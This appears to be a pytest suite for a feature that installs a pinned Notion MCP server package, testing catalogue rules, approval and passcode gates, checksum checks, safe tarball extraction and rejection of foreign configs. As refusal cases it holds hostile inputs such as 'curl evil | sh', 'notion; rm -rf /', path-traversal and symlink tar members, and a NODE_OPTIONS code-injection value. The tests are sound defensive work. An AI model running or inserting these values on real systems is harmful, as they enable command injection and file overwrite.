"""Desk connect-by-URL, slice 4: the MCP approval/activation adapter
(docs/DESK_CONNECT_BY_URL_SPEC.md, "Slice 4 as built"; Dave 2026-10-03: curated
packages first, arbitrary packages wait for installer hardening; Wren's audit and Dave's
picks, 2026-10-05).

Pinned:

  * the curated catalogue is data that cannot carry executable configuration: a
    command, an argument, a URL, an unpinned version, a remote kind, a non-OSI licence,
    a tarball that is not this package's registry address, or an entry without `tarball`,
    `entry` and a reviewed `bundled: true` is refused when the file is loaded;
  * Notion's MCP row is a selectable method with a review card built from the
    catalogue alone; every other service keeps "MCP: information only";
  * an unattended caller gets 403 before anything is read, a missing or wrong
    passcode writes nothing, and a good Save asks for the passcode exactly once;
  * the install must be approved with the pins that were shown: an absent approval or a
    changed package, version or checksum is refused BEFORE the passcode;
  * Save downloads the ONE catalogue tarball itself (no npm, no npx, no subprocess),
    checks its sha512 against the catalogue, safe-extracts it into Clayrune's own directory
    and registers `with-secret.py --raw --unset NODE_OPTIONS --unset NODE_PATH ... -- <node> <dir>/package/<entry>`; the config
    names the vault entry and holds no value and no `env`;
  * a wrong checksum, a traversal / link / duplicate member, a network failure or timeout,
    a missing Node.js or a failed config write leave the committed token in place and read
    "Saved; setup failed", never registered; a retry does not ask for the token again;
  * a passphrase-backed vault is registered like any other (MC-1047: the wrapper relays the
    launch to the server's streaming exec);
  * a server of the same name that is not ours (including one that differs only in
    `command`) is never replaced.
"""
from __future__ import annotations

import ast
import copy
import io
import json
import sys
import tarfile
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO))

from tests.test_desk_connect import (PASSCODE, RID, SECRET, _commit_req, _vault_names,  # noqa: E402,F401
                                     env as _base_env)

from mc.desk_connect import mcp_activation, mcp_catalogue, mcp_package_store  # noqa: E402

URL = 'https://www.notion.so'
ENTRY_BODY = b'// fixture entry: the real package is never downloaded by the tests\n'


def _notion() -> dict:
    e = mcp_catalogue.for_service('notion')
    assert e is not None
    return e


def _tar(members) -> bytes:
    """A gzip tarball of `(name, kind, payload)`: kind is file | dir | symlink | hardlink."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w:gz') as tf:
        for name, kind, payload in members:
            ti = tarfile.TarInfo(name)
            if kind == 'file':
                ti.size = len(payload)
                tf.addfile(ti, io.BytesIO(payload))
            elif kind == 'dir':
                ti.type = tarfile.DIRTYPE
                tf.addfile(ti)
            else:
                ti.type = tarfile.SYMTYPE if kind == 'symlink' else tarfile.LNKTYPE
                ti.linkname = payload
                tf.addfile(ti)
    return buf.getvalue()


GOOD = [('package/package.json', 'file', b'{"name":"fixture","version":"2.5.2"}'),
        ('package/bin', 'dir', None),
        ('package/bin/cli.mjs', 'file', ENTRY_BODY)]


@pytest.fixture()
def env(_base_env, tmp_path, monkeypatch):
    """The slice-1 environment plus a throwaway MCP config (never the real
    ~/.claude.json), a fake Node on PATH and a fake registry: `rec['served']` is what the
    download returns, `rec['pinned']` is the tarball the (patched) catalogue was reviewed
    against. The real catalogue entry, with its checksum swapped for the fixture's."""
    from mc import mcp
    cfg = tmp_path / 'claude.json'
    monkeypatch.setattr(mcp, 'GLOBAL_CLAUDE_JSON', cfg)
    real = copy.deepcopy(mcp_catalogue.for_service('notion'))
    good = _tar(GOOD)
    rec = {'pinned': good, 'served': good, 'error': None, 'fetched': [], 'tools': {'node': 'C:/fake/node'}}

    def for_service(service_id):
        if service_id != 'notion':
            return None
        e = copy.deepcopy(real)
        e['integrity'] = mcp_package_store.integrity_of(rec['pinned'])
        return e

    def fetch(url, limit, timeout):
        rec['fetched'].append(url)
        if rec['error'] is not None:
            raise rec['error']
        return rec['served']

    monkeypatch.setattr(mcp_catalogue, 'for_service', for_service)
    monkeypatch.setattr(mcp_package_store, '_fetch', fetch)
    monkeypatch.setattr(mcp_activation, '_which', lambda name: rec['tools'].get(name))
    client, calls, _home = _base_env
    return client, calls, rec, cfg


def _install(**over):
    e = _notion()
    d = {'approved': True, **mcp_catalogue.pins(e)}
    d.update(over)
    return d


def _draft(secret=SECRET, install=None, **fields):
    f = {'install': _install() if install is None else install}
    if secret:
        f['secret'] = secret
    f.update(fields)
    return {'url': URL, 'method': 'mcp', 'fields': f}


def _servers(cfg):
    return json.loads(cfg.read_text(encoding='utf-8')).get('mcpServers', {}) if cfg.exists() else {}


def _package_files(tmp_path) -> list[str]:
    root = tmp_path / '.clayrune' / 'mcp_packages'
    return sorted(str(p.relative_to(root)).replace('\\', '/') for p in root.rglob('*')) if root.exists() else []


# -- the catalogue -----------------------------------------------------------------

def _entry():
    return copy.deepcopy(json.loads(mcp_catalogue.CATALOGUE_PATH.read_text(encoding='utf-8'))['packages'][0])


def _load_with(tmp_path, mutate):
    e = _entry()
    mutate(e)
    p = tmp_path / 'cat.json'
    p.write_text(json.dumps({'version': 1, 'packages': [e]}), encoding='utf-8')
    return mcp_catalogue.load(p)


def test_the_shipped_catalogue_is_valid_pinned_and_bundled():
    e = mcp_catalogue.load()['by_service']['notion']                  # the file itself, not the patched lookup
    assert e['kind'] == 'npx' and e['package'] == '@notionhq/notion-mcp-server'
    assert e['version'].count('.') == 2 and e['integrity'].startswith('sha512-')
    assert e['tarball'] == 'https://registry.npmjs.org/@notionhq/notion-mcp-server/-/notion-mcp-server-2.5.2.tgz'
    assert e['entry'] == 'bin/cli.mjs' and e['bundled'] is True
    assert mcp_catalogue.for_service('x') is None and mcp_catalogue.for_service(None) is None


def _drop(key):
    return lambda e: e.pop(key)


@pytest.mark.parametrize('mutate', [
    lambda e: e.update(command='curl evil | sh'),                      # no executable configuration of its own
    lambda e: e.update(args=['--flag']),
    lambda e: e.update(url='https://mcp.example/sse'),
    lambda e: e.update(kind='remote'),                                 # remote endpoints need their own review
    lambda e: e.update(kind='uvx'),
    lambda e: e.update(version='^2.5.2'),                              # a range is not a pin
    lambda e: e.update(version='latest'),
    lambda e: e.update(version='2.5.2-beta.1'),
    lambda e: e.update(integrity='sha1-abc'),
    lambda e: e.update(licence='Proprietary'),
    lambda e: e.update(package='notion; rm -rf /'),
    lambda e: e['credential'].update(vault='ron@example'),
    lambda e: e['credential'].update(vault='oauth.notion'),
    lambda e: e['credential'].update(env='lower'),
    lambda e: e['credential'].update(value='ntn_real'),                # no value field, ever
    lambda e: e.update(server_name='bad name'),
    lambda e: e.update(permissions=[]),
    # the verified-tarball launch: all three fields are required, and each is constrained
    _drop('tarball'), _drop('entry'), _drop('bundled'),
    lambda e: e.update(bundled=False),
    lambda e: e.update(bundled='true'),
    lambda e: e.update(tarball='https://evil.example/notion-mcp-server-2.5.2.tgz'),
    lambda e: e.update(tarball='http://registry.npmjs.org/@notionhq/notion-mcp-server/-/notion-mcp-server-2.5.2.tgz'),
    lambda e: e.update(tarball='https://registry.npmjs.org/@notionhq/notion-mcp-server/-/notion-mcp-server-9.9.9.tgz'),
    lambda e: e.update(tarball='https://registry.npmjs.org/@notionhq/other/-/other-2.5.2.tgz'),
    lambda e: e.update(entry='../escape.mjs'),
    lambda e: e.update(entry='/etc/passwd.js'),
    lambda e: e.update(entry='bin/../../x.mjs'),
    lambda e: e.update(entry='C:\\x.mjs'),
    lambda e: e.update(entry='bin/cli.sh'),
])
def test_a_catalogue_entry_that_breaks_a_rule_is_refused(tmp_path, mutate):
    with pytest.raises(mcp_catalogue.CatalogueError):
        _load_with(tmp_path, mutate)


def test_the_catalogue_is_read_from_next_to_the_module_only():
    assert mcp_catalogue.CATALOGUE_PATH.parent == Path(mcp_catalogue.__file__).parent


def test_the_review_card_holds_only_catalogue_facts():
    card = mcp_catalogue.card(_notion())
    assert set(card) == {'id', 'name', 'kind', 'source', 'version', 'integrity', 'licence', 'unpacked_bytes',
                         'purpose', 'permissions', 'server_name', 'credential', 'pins'}
    assert 'readme' not in json.dumps(card).lower()
    assert set(card['credential']) == {'env', 'vault', 'label'}


def test_the_card_says_page_text_reaches_agents_with_tools_in_every_project():
    perms = mcp_catalogue.load()['by_service']['notion']['permissions']
    line = [p for p in perms if 'reach your agents' in p]
    assert len(line) == 1 and 'which have tools' in line[0] and 'every project' in line[0]


def test_the_card_text_no_longer_claims_node_checks_the_package():
    js = (REPO / 'static' / 'js' / 'desk-v1-connect-install.js').read_text(encoding='utf-8')
    assert 'Node.js fetches' not in js and 'Nothing is downloaded' not in js
    assert 'Clayrune itself downloads this one file from the public npm registry' in js
    assert 'npm is not used' in js


# -- the Method step ---------------------------------------------------------------

def test_notion_offers_a_selectable_mcp_method_with_its_review_card(env):
    client, _, _, _ = env
    got = client.post('/api/desk/connect/inspect', json={'input': 'Notion'}).get_json()
    assert got['service']['id'] == 'notion'
    mcp_rows = [o for o in got['options'] if o['method'] == 'mcp']
    assert len(mcp_rows) == 1 and mcp_rows[0]['support'] == 'available' and mcp_rows[0]['selectable'] is True
    card = mcp_rows[0]['connector']['install']
    assert card['pins'] == mcp_catalogue.pins(_notion())
    assert [f['key'] for f in mcp_rows[0]['connector']['fields']] == ['secret', 'allow_unattended']
    assert SECRET not in json.dumps(got)


def test_other_services_keep_mcp_information_only(env):
    client, _, _, _ = env
    for host in ('https://x.com', 'https://platform.openai.com', 'https://plausible.io'):
        got = client.post('/api/desk/connect/inspect', json={'input': host}).get_json()
        rows = [o for o in got['options'] if o['method'] == 'mcp']
        assert len(rows) == 1 and rows[0]['support'] == 'info_only' and rows[0]['selectable'] is False, host
        assert 'connector' not in rows[0], host


def test_a_hand_built_mcp_request_for_another_service_is_refused(env):
    client, calls, rec, cfg = env
    d = _draft()
    d['url'] = 'https://platform.openai.com'
    r = _commit_req(client, d)
    assert r.status_code == 400 and r.get_json()['code'] == 'method_not_available'
    assert calls['n'] == 0 and _vault_names() == [] and _servers(cfg) == {} and rec['fetched'] == []


# -- the gates ---------------------------------------------------------------------

def test_an_agent_session_gets_403_and_nothing_is_read_or_written(env):
    from mc.state import agent_sessions
    client, calls, rec, cfg = env
    agent_sessions['scheduled-1'] = {'status': 'running', 'trigger_type': 'scheduled', 'project_id': 'p'}
    r = _commit_req(client, _draft())
    assert r.status_code == 403
    assert calls['n'] == 0 and _vault_names() == [] and _servers(cfg) == {} and rec['fetched'] == []


@pytest.mark.parametrize('install', [None, {}, {'approved': False, 'package': 'x', 'version': 'x', 'integrity': 'x'},
                                     {'package': 'x'}, 'yes'])
def test_an_install_that_was_not_approved_is_refused_before_the_passcode(env, install):
    client, calls, rec, cfg = env
    d = _draft()
    if install is None:
        d['fields'].pop('install')
    else:
        d['fields']['install'] = install
    r = _commit_req(client, d)
    assert r.status_code == 400 and r.get_json()['code'] == 'install_not_approved'
    assert calls['n'] == 0 and _vault_names() == [] and _servers(cfg) == {} and rec['fetched'] == []


def test_an_approval_with_the_right_pins_but_approved_false_is_refused(env):
    client, calls, rec, cfg = env
    r = _commit_req(client, _draft(install=_install(approved=False)))
    assert r.status_code == 400 and r.get_json()['code'] == 'install_not_approved'
    assert calls['n'] == 0 and _vault_names() == []


@pytest.mark.parametrize('over', [{'version': '2.5.3'}, {'package': '@notionhq/other'},
                                  {'integrity': 'sha512-' + 'A' * 86 + '=='}])
def test_changed_pins_are_refused_before_the_passcode(env, over):
    client, calls, rec, cfg = env
    r = _commit_req(client, _draft(install=_install(**over)))
    assert r.status_code == 409 and r.get_json()['code'] == 'pins_changed'
    assert calls['n'] == 0 and _vault_names() == [] and _servers(cfg) == {} and rec['fetched'] == []


def test_pins_that_change_between_the_check_and_the_write_are_refused(env, monkeypatch):
    from mc.desk_connect import providers
    from mc.desk_connect.providers.base import ProviderError
    prov = providers.for_service('notion')
    clean = prov.clean('mcp', _draft()['fields'], set())
    bumped = copy.deepcopy(_notion())
    bumped['version'] = '9.9.9'
    monkeypatch.setattr(mcp_catalogue, 'for_service', lambda s: copy.deepcopy(bumped))
    with pytest.raises(ProviderError) as e:
        prov.apply('mcp', clean, None)
    assert e.value.code == 'pins_changed'
    assert _vault_names() == []


@pytest.mark.parametrize('passcode', ['', 'wrong-passcode', None])
def test_a_missing_or_wrong_passcode_writes_nothing(env, passcode):
    client, calls, rec, cfg = env
    body = {'request_id': RID, 'draft': _draft()}
    if passcode is not None:
        body['passcode'] = passcode
    r = client.post('/api/desk/connect/commit', json=body)
    assert r.status_code == 403
    assert calls['n'] == 1 and _vault_names() == [] and _servers(cfg) == {} and rec['fetched'] == []


# -- a good Save -------------------------------------------------------------------

def test_a_good_save_stores_the_token_installs_the_verified_package_and_registers_it(env, tmp_path):
    client, calls, rec, cfg = env
    r = _commit_req(client, _draft())
    body = r.get_json()
    assert r.status_code == 201, body
    assert calls['n'] == 1                                            # exactly one passcode check per Save
    assert body['stored'] == ['notion.token']
    assert body['setup']['state'] == 'done' and body['setup']['server'] == 'notion'
    assert body['approval'] == mcp_catalogue.pins(_notion())
    assert body['status']['state'] == 'registered' and body['status']['label'] == 'Registered with agents, not verified'
    # Clayrune itself fetched exactly the one catalogue tarball, nothing else.
    assert rec['fetched'] == [_notion()['tarball']]
    where = tmp_path / '.clayrune' / 'mcp_packages' / 'notion' / '2.5.2'
    assert (where / 'package' / 'bin' / 'cli.mjs').read_bytes() == ENTRY_BODY
    assert _package_files(tmp_path) == ['notion', 'notion/2.5.2', 'notion/2.5.2/package', 'notion/2.5.2/package/bin',
                                        'notion/2.5.2/package/bin/cli.mjs', 'notion/2.5.2/package/package.json']
    srv = _servers(cfg)['notion']
    assert set(srv) == {'command', 'args'}                            # no env, no headers, no url
    assert srv['args'][1:] == ['--raw', '--unset', 'NODE_OPTIONS', '--unset', 'NODE_PATH',
                               '--env', 'NOTION_TOKEN=notion.token', '--', 'C:/fake/node',
                               str(where / 'package' / 'bin' / 'cli.mjs')]
    assert srv['args'][0].replace('\\', '/').endswith('tools/with-secret.py')
    assert 'npx' not in json.dumps(srv) and '-y' not in srv['args']
    assert _vault_names() == ['notion.token']
    assert SECRET not in cfg.read_text(encoding='utf-8') and SECRET not in json.dumps(body)


def test_the_package_lands_outside_the_repo_and_data_dir(tmp_path, env):
    where = mcp_package_store.package_dir(_notion())
    assert tmp_path in where.parents                                   # under CLAYRUNE_HOME (this test's temp dir)
    for forbidden in (REPO, REPO / 'data'):
        assert forbidden not in where.parents


def test_a_replayed_request_id_writes_nothing_twice(env):
    client, calls, rec, cfg = env
    assert _commit_req(client, _draft()).status_code == 201
    r = _commit_req(client, _draft())
    assert r.status_code == 200 and r.get_json()['duplicate'] is True
    assert len(rec['fetched']) == 1 and list(_servers(cfg)) == ['notion']


def test_no_credential_value_reaches_the_log(env, capsys):
    client, _, _, _ = env
    _commit_req(client, _draft())
    out = capsys.readouterr()
    assert SECRET not in out.out and SECRET not in out.err


def test_the_launch_line_comes_from_the_catalogue_only(env):
    cfg = mcp_activation.launch_config(_notion())
    assert cfg['command'] == sys.executable
    assert cfg['args'][1:] == ['--raw', '--unset', 'NODE_OPTIONS', '--unset', 'NODE_PATH',
                               '--env', 'NOTION_TOKEN=notion.token', '--', 'C:/fake/node',
                               str(mcp_package_store.entry_path(_notion()))]


def test_nothing_in_the_path_can_start_npm_or_any_process():
    for name in ('mcp_activation', 'mcp_package_store', 'mcp_errors'):
        tree = ast.parse((REPO / 'mc' / 'desk_connect' / f'{name}.py').read_text(encoding='utf-8'))
        mods = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                mods |= {a.name.split('.')[0] for a in node.names}
            elif isinstance(node, ast.ImportFrom):
                mods.add((node.module or '').split('.')[0])
        assert not mods & {'subprocess', 'requests', 'httpx', 'aiohttp', 'tempfile'}, (name, mods)
    assert not hasattr(mcp_activation, 'check_pin') and not hasattr(mcp_activation, 'PUBLIC_REGISTRY')


def test_saving_again_replaces_the_package_directory_as_a_whole(env, tmp_path):
    client, calls, rec, cfg = env
    assert _commit_req(client, _draft()).status_code == 201
    stale = tmp_path / '.clayrune' / 'mcp_packages' / 'notion' / '2.5.2' / 'package' / 'stale.txt'
    stale.write_text('left by something else', encoding='utf-8')
    r = _commit_req(client, _draft(secret=''), rid='req-0002-abcdef')
    assert r.status_code == 201 and r.get_json()['setup']['state'] == 'done'
    assert not stale.exists() and len(rec['fetched']) == 2            # what a launch runs is what was just verified


# -- partial provisioning: the committed token stays, the setup is reported failed -------

def _assert_setup_failed(r, code, cfg, calls):
    body = r.get_json()
    assert r.status_code == 201, body
    assert body['setup']['state'] == 'failed' and body['setup']['code'] == code
    assert body['stored'] == ['notion.token'] and _vault_names() == ['notion.token']   # not rolled back
    assert 'notion' not in _servers(cfg)
    assert calls['n'] == 1
    return body


def test_a_checksum_the_registry_does_not_serve_is_not_registered_or_unpacked(env, tmp_path):
    client, calls, rec, cfg = env
    rec['served'] = _tar(GOOD + [('package/extra.js', 'file', b'tampered')])     # not the reviewed bytes
    body = _assert_setup_failed(_commit_req(client, _draft()), 'pin_mismatch', cfg, calls)
    assert body['status']['state'] == 'setup_failed' and body['status']['label'] == 'Saved; setup failed'
    assert 'NOT registered' in body['setup']['message'] and 'checksum' in body['setup']['message']
    assert _package_files(tmp_path) == []                              # nothing was written before the hash matched


def test_missing_node_is_a_failed_setup_with_the_token_kept_and_nothing_downloaded(env, tmp_path):
    client, calls, rec, cfg = env
    rec['tools'].pop('node')
    body = _assert_setup_failed(_commit_req(client, _draft()), 'node_missing', cfg, calls)
    assert 'Node.js' in body['setup']['message']
    assert rec['fetched'] == [] and _package_files(tmp_path) == []


@pytest.mark.parametrize('error, code', [
    (OSError('connection reset'), 'download_failed'),
    (__import__('urllib.error').error.URLError('no route'), 'download_failed'),
    (ValueError('larger than any reviewed package'), 'download_failed'),
    (TimeoutError('timed out'), 'download_timeout'),
])
def test_a_network_failure_is_a_failed_setup_with_the_token_kept(env, tmp_path, error, code):
    client, calls, rec, cfg = env
    rec['error'] = error
    body = _assert_setup_failed(_commit_req(client, _draft()), code, cfg, calls)
    assert 'connection reset' not in body['setup']['message'] and 'no route' not in body['setup']['message']
    assert _package_files(tmp_path) == []


def test_a_package_that_lacks_the_entry_file_is_not_registered(env, tmp_path):
    client, calls, rec, cfg = env
    rec['pinned'] = rec['served'] = _tar([('package/package.json', 'file', b'{}')])
    _assert_setup_failed(_commit_req(client, _draft()), 'package_invalid', cfg, calls)
    assert _package_files(tmp_path) == []


@pytest.mark.parametrize('bad_member', [
    ('package/../../evil.txt', 'file', b'x'),                           # traversal
    ('package/bin/../../../evil.txt', 'file', b'x'),
    ('../evil.txt', 'file', b'x'),
    ('/abs/evil.txt', 'file', b'x'),                                    # absolute
    ('C:/evil.txt', 'file', b'x'),                                      # drive letter
    ('package\\evil.txt', 'file', b'x'),                                # backslash
    ('evil.txt', 'file', b'x'),                                         # outside package/
    ('package/link', 'symlink', '../../outside'),                       # links
    ('package/hard', 'hardlink', 'package/package.json'),
    ('package/bin/cli.mjs', 'file', b'second copy'),                    # a duplicate cannot replace a file
])
def test_an_unsafe_tarball_member_refuses_the_whole_package(env, tmp_path, bad_member):
    client, calls, rec, cfg = env
    evil = _tar(GOOD + [bad_member])
    rec['pinned'] = rec['served'] = evil                                # the hash matches: the checksum is not the defence here
    _assert_setup_failed(_commit_req(client, _draft()), 'package_invalid', cfg, calls)
    assert _package_files(tmp_path) == []                               # the temp directory is gone, no final directory
    assert not list(tmp_path.rglob('evil.txt')) and not (tmp_path.parent / 'evil.txt').exists()


def test_a_tarball_larger_than_its_reviewed_size_is_refused(env, tmp_path):
    from mc.desk_connect.mcp_errors import ActivationError
    dest = tmp_path / 'out'
    dest.mkdir()
    with pytest.raises(ActivationError) as e:
        mcp_package_store._extract(_tar(GOOD), dest, 4)
    assert e.value.code == 'package_invalid'


def test_not_a_tarball_at_all_is_refused(env, tmp_path):
    client, calls, rec, cfg = env
    rec['pinned'] = rec['served'] = b'this is not gzip'
    _assert_setup_failed(_commit_req(client, _draft()), 'package_invalid', cfg, calls)
    assert _package_files(tmp_path) == []


def test_a_config_write_failure_is_a_failed_setup(env, monkeypatch):
    client, calls, rec, cfg = env
    from mc import mcp

    def boom(*a, **k):
        raise OSError('disk full')
    monkeypatch.setattr(mcp, 'write_server', boom)
    _assert_setup_failed(_commit_req(client, _draft()), 'register_failed', cfg, calls)


def test_a_bug_in_provisioning_reads_as_a_failed_setup_never_as_success(env, monkeypatch):
    client, calls, rec, cfg = env

    def boom(entry):
        raise RuntimeError('x')
    monkeypatch.setattr(mcp_activation, 'register', boom)
    _assert_setup_failed(_commit_req(client, _draft()), 'setup_failed', cfg, calls)


def test_a_retry_after_a_failed_setup_does_not_ask_for_the_token_again(env):
    client, calls, rec, cfg = env
    rec['error'] = OSError('offline')
    assert _commit_req(client, _draft()).status_code == 201 and 'notion' not in _servers(cfg)
    rec['error'] = None
    got = client.post('/api/desk/connect/inspect', json={'input': 'Notion'}).get_json()
    f = next(o for o in got['options'] if o['method'] == 'mcp')['connector']['fields'][0]
    assert f['present'] is True and f['required'] is False
    r = _commit_req(client, _draft(secret=''), rid='req-0002-abcdef')
    assert r.status_code == 201, r.get_json()
    assert r.get_json()['setup']['state'] == 'done' and r.get_json()['stored'] == []
    assert calls['n'] == 2                                            # one check per Save
    assert _vault_names() == ['notion.token'] and 'notion' in _servers(cfg)


def test_saving_again_when_already_registered_changes_nothing_in_the_config(env):
    client, calls, rec, cfg = env
    assert _commit_req(client, _draft()).status_code == 201
    before = cfg.read_text(encoding='utf-8')
    r = _commit_req(client, _draft(secret=''), rid='req-0002-abcdef')
    assert r.status_code == 201 and r.get_json()['setup']['state'] == 'done'
    assert cfg.read_text(encoding='utf-8') == before


# -- a passphrase-backed vault: registered like any other (MC-1047) -------------------

def _wrap_vault():
    """Put the vault in passphrase mode the way `secrets_store.lock_state()` sees it."""
    from mc import secrets_store
    p = secrets_store.wrapped_key_path()
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text('{}', encoding='utf-8')


def test_the_vault_check_is_the_wrapped_key_file_the_vault_itself_uses(env):
    from mc import secrets_store
    assert mcp_activation.passphrase_backed() is False
    _wrap_vault()
    assert mcp_activation.passphrase_backed() is True
    assert secrets_store.lock_state() == 'locked'                      # the same signal, not a second definition


def test_a_passphrase_backed_vault_registers_the_server_like_any_other(env, tmp_path, monkeypatch):
    """MC-1047 shipped the server-side streaming exec, so a passphrase-backed vault no longer
    parks the Save in a waiting state: the package is installed and the launch line registered
    exactly as on a plain vault (the wrapper relays to the server at start time)."""
    from mc import secrets_store
    client, calls, rec, cfg = env
    key = secrets_store.load_master_key()[0]
    _wrap_vault()                                                      # the vault is passphrase-backed ...
    monkeypatch.setattr(secrets_store, '_unlocked_key', key)           # ... and the human has unlocked it in the server
    r = _commit_req(client, _draft())
    body = r.get_json()
    assert r.status_code == 201, body
    assert calls['n'] == 1 and body['stored'] == ['notion.token']
    assert body['setup']['state'] == 'done' and body['setup']['server'] == 'notion'
    assert body['status']['state'] == 'registered'
    assert 'notion' in _servers(cfg) and len(rec['fetched']) == 1
    assert mcp_package_store.entry_path(_notion()).is_file()


def test_provision_does_not_look_at_the_vault_mode(env, monkeypatch):
    from mc import secrets_store
    _wrap_vault()
    monkeypatch.setattr(secrets_store, '_unlocked_key', b'k' * 32)
    assert secrets_store.lock_state() == 'unlocked'
    out = mcp_activation.provision(_notion())
    assert out['setup']['state'] == 'done' and out['setup']['code'] == ''


# -- a server that is not ours -----------------------------------------------------

def test_a_server_of_the_same_name_that_is_not_ours_is_never_replaced(env):
    client, calls, rec, cfg = env
    from mc import mcp
    mcp.write_server('notion', 'stdio', {'command': 'node', 'args': ['mine.js']}, 'global')
    before = cfg.read_text(encoding='utf-8')
    r = _commit_req(client, _draft())
    assert r.status_code == 409 and r.get_json()['code'] == 'server_exists'
    assert calls['n'] == 0 and _vault_names() == [] and rec['fetched'] == []   # refused before the passcode
    assert cfg.read_text(encoding='utf-8') == before


def _ours() -> dict:
    return mcp_activation.launch_config(_notion())


@pytest.mark.parametrize('mutate', [
    lambda c: c.update(command='C:/evil/not-python.exe'),               # the same args behind another program
    lambda c: c.update(command='/usr/bin/sh'),
    lambda c: c.update(command=['python']),
    lambda c: c.pop('command'),
    lambda c: c.update(env={'NODE_OPTIONS': '--require C:/evil.js'}),   # an env block can inject code
    lambda c: c.update(url='https://evil.example/sse'),
    lambda c: c.update(headers={'x': 'y'}),
    lambda c: c.update(type='http'),
    lambda c: c['args'].append('--extra'),
    lambda c: c['args'].insert(0, '--evil'),
    lambda c: c['args'].__setitem__(-2, 'C:/fake/not-node'),            # a different program in the node slot
    lambda c: c['args'].__setitem__(-1, 'C:/elsewhere/package/bin/cli.mjs'),
    lambda c: c['args'].__setitem__(-1, c['args'][-1].replace('2.5.2', '2.5.1')),   # another version
    lambda c: c['args'].__setitem__(6, 'NOTION_TOKEN=some.other-secret'),
    lambda c: c['args'].__setitem__(1, '--no-such-flag'),
])
def test_is_ours_checks_the_whole_launch_line_including_command(mutate):
    cfg = _ours()
    assert mcp_activation.is_ours(cfg, _notion()) is True
    mutate(cfg)
    assert mcp_activation.is_ours(cfg, _notion()) is False


def test_is_ours_accepts_the_same_line_written_with_other_absolute_paths():
    cfg = _ours()
    cfg['command'] = 'C:\\Python311\\python.exe'
    cfg['args'][0] = 'D:\\clones\\mc\\tools\\with-secret.py'
    cfg['args'][-2] = 'C:\\Program Files\\nodejs\\node.exe'
    cfg['args'][-1] = 'D:\\home\\.clayrune\\mcp_packages\\notion\\2.5.2\\package\\bin\\cli.mjs'
    assert mcp_activation.is_ours(cfg, _notion()) is True
    assert mcp_activation.is_ours(None, _notion()) is False and mcp_activation.is_ours('x', _notion()) is False


def test_a_server_that_differs_only_in_its_command_is_not_replaced_and_not_called_registered(env):
    client, calls, rec, cfg = env
    from mc import mcp
    foreign = _ours()
    foreign['command'] = 'C:/evil/not-python.exe'
    mcp.write_server('notion', 'stdio', foreign, 'global')
    before = cfg.read_text(encoding='utf-8')
    assert mcp_activation.is_registered(_notion()) is False
    r = _commit_req(client, _draft())
    assert r.status_code == 409 and r.get_json()['code'] == 'server_exists' and calls['n'] == 0
    assert cfg.read_text(encoding='utf-8') == before


def test_a_new_token_over_an_existing_entry_is_refused(env):
    client, calls, rec, cfg = env
    from mc import secrets_store
    secrets_store.set_secret('notion.token', 'old-token', description='', scope='global')
    r = _commit_req(client, _draft())                                 # a typed token while one exists: refused, as for every key
    assert r.status_code == 409 and calls['n'] == 0 and _servers(cfg) == {}


# -- status ------------------------------------------------------------------------

def test_the_status_of_an_mcp_method_is_never_verified(env):
    client, _, rec, cfg = env
    _commit_req(client, _draft())
    st = client.post('/api/desk/connect/verify', json={'service': 'notion', 'method': 'mcp', 'check': False}).get_json()
    assert st['state'] == 'registered' and st['label'] == 'Registered with agents, not verified'
    v = client.post('/api/desk/connect/verify', json={'service': 'notion', 'method': 'mcp'}).get_json()
    assert v['state'] == 'registered'                                 # no free read-only check exists
    assert len(rec['fetched']) == 1                                   # and the check downloaded nothing


def test_the_status_reads_setup_failed_when_the_token_is_stored_and_no_server_is(env):
    client, _, rec, cfg = env
    rec['error'] = OSError('offline')
    _commit_req(client, _draft())
    st = client.post('/api/desk/connect/verify', json={'service': 'notion', 'method': 'mcp', 'check': False}).get_json()
    assert st['state'] == 'setup_failed' and st['label'] == 'Saved; setup failed'
